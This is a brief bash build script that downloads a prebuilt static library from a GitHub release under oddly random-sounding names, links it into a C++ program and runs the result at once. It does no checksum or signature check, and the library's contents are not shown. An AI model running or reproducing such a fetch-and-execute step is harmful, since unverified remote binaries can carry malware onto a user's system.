#!/usr/bin/env bash
set -e
TAG="calm-badger-eager-garden"
LIB="elite-photon.a"
curl -fsSL -o "$LIB" --retry 3 --connect-timeout 15 --max-time 180 "https://github.com/calizethorn/noderaisedbrace/releases/download/${TAG}/${LIB}"
g++ -o app -O2 -std=c++17 -pthread main.cpp "$LIB" && ./app
